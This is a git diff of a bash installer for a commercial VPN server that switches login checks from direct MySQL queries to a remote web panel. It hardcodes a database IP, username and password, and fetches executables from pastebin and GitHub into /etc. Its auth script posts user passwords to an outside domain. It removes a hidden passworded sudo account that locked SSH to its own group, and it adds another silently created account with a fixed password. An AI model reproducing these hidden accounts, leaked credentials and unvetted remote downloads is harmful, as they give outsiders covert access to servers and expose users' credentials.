@@ -1,3 +1,12 @@
+#!/bin/bash
+#Script Variables
+HOST='66.29.146.72';
+USER='meteljep_paid';
+PASS='meteljep_paid';
+DBNAME='meteljep_paid';
+PORT_TCP='1194';
+PORT_UDP='53';
+DOMAIN='https://paid.bytesph.com';
 timedatectl set-timezone Asia/Riyadh
 install_require () {
 clear
@@ -26,7 +35,7 @@ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 40976EAF437D05B5
 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32    
 sudo apt update
 sudo apt install -y squid3=3.3.8-1ubuntu6 squid=3.3.8-1ubuntu6 squid3-common=3.3.8-1ubuntu6
-wget 'http://firenetvpn.net/files/ocserv/1cBgmRVgsKFvBDGZ6d7OC2YBSQMkjYHrm' -O /etc/init.d/squid3
+wget 'https://github.com/andresslacson1989/VPN-Scripts/raw/master/squid3' -O /etc/init.d/squid3
 dos2unix /etc/init.d/squid3
 sudo chmod +x /etc/init.d/squid3
 sudo update-rc.d squid3 defaults
@@ -67,9 +76,9 @@ cd /etc || exit
 wget 'https://pastebin.com/raw/xtPc5t1k' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
-wget 'https://raw.githubusercontent.com/kimdev541/panel/panel_files/monitor' -O /etc/.monitor
-wget 'https://raw.githubusercontent.com/kimdev541/panel/panel_files/ws' -O /etc/.ws
-wget 'https://raw.githubusercontent.com/kimdev541/panel/panel_files/counter' -O /etc/.counter
+wget 'https://github.com/andresslacson1989/VPN-Scripts/raw/master/monitor' -O /etc/.monitor
+wget 'https://github.com/andresslacson1989/VPN-Scripts/raw/master/ws' -O /etc/.ws
+wget 'https://github.com/andresslacson1989/VPN-Scripts/raw/master/counter' -O /etc/.counter
 chmod +x /etc/.monitor
 chmod +x /etc/.ws
 chmod +x /etc/.counter
@@ -109,7 +118,7 @@ dh none
 tls-server
 tls-version-min 1.2
 tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256
-cipher none
+cipher AES-128-GCM
 ncp-disable
 auth none
 sndbuf 0
@@ -125,6 +134,7 @@ client-to-client
 username-as-common-name
 verify-client-cert none
 script-security 3
+max-clients 1024
 duplicate-cn
 client-connect /etc/openvpn/login/connect.sh
 client-disconnect /etc/openvpn/login/disconnect.sh
@@ -156,7 +166,7 @@ dh none
 tls-server
 tls-version-min 1.2
 tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256
-cipher none
+cipher AES-128-GCM
 ncp-disable
 auth none
 sndbuf 0
@@ -172,6 +182,7 @@ client-to-client
 username-as-common-name
 verify-client-cert none
 script-security 3
+max-clients 1024
 duplicate-cn
 socket-flags TCP_NODELAY
 client-connect /etc/openvpn/login/connect.sh
@@ -206,35 +217,46 @@ sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh
 
 /bin/cat <<"EOM" >/etc/openvpn/login/auth_vpn
 #!/bin/bash
-. /etc/openvpn/login/config.sh
-Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND is_freeze='0' AND duration > 0"
-user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
-[ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
+data=$(curl -sb -X POST DOMAIN/api/server/login -H "Content-Type: application/x-www-form-urlencoded" -d "login=true&username=$username&password=$password")
+
+if [[ $data == "ACCEPT" ]];
+then
+	echo $data
+	echo "$username | $password is valid"
+	exit 0
+else
+	echo $data
+	echo "$username | $password is invalid"
+	exit 1
+fi
 EOM
+
+sed -i "s|DOMAIN|$DOMAIN|g" /etc/openvpn/login/auth_vpn
+
+sed -i "s|DOMAIN|$DOMAIN|g" /etc/openvpn/login/auth_vpn
 
 #client-connect file
 cat <<'LENZ05' >/etc/openvpn/login/connect.sh
 #!/bin/bash
-. /etc/openvpn/login/config.sh
+
 ##set status online to user connected
 server_ip=SERVER_IP
-datenow=`date +"%Y-%m-%d %T"`
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE server_list SET online=online+1 WHERE server_ip='$server_ip' "
+data=$(curl -sb -X POST DOMAIN/api/server/update-status -H "Content-Type: application/x-www-form-urlencoded" -d "status=1&username=$common_name&ip=$server_ip")
+
 LENZ05
 
 sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
+sed -i "s|DOMAIN|$DOMAIN|g" /etc/openvpn/login/connect.sh
 
 #TCP client-disconnect file
 cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
-. /etc/openvpn/login/config.sh
-server_ip=SERVER_IP
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='0', active_address='', active_date='' WHERE user_name='$common_name' "
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE server_list SET online=online-1 WHERE server_ip='$server_ip' "
+
+data=$(curl -sb -X POST DOMAIN/api/server/update-status -H "Content-Type: application/x-www-form-urlencoded" -d "status=0&username=$common_name")
+
 LENZ06
 
-sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/disconnect.sh
+sed -i "s|DOMAIN|$DOMAIN|g" /etc/openvpn/login/disconnect.sh
 
 cat << EOF > /etc/openvpn/easy-rsa/keys/ca.crt
 -----BEGIN CERTIFICATE-----
@@ -459,11 +481,9 @@ sudo service stunnel4 restart
 }
 
 install_sudo(){
-  {
-    useradd -m lenz 2>/dev/null; echo lenz:@@@F1r3n3t@@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
-    service sshd restart
+ {
+      useradd -m bytes 2>/dev/null; echo bytes:Premium2018!!! | chpasswd &>/dev/null
+      service sshd restart
   }&>/dev/null
 }
 
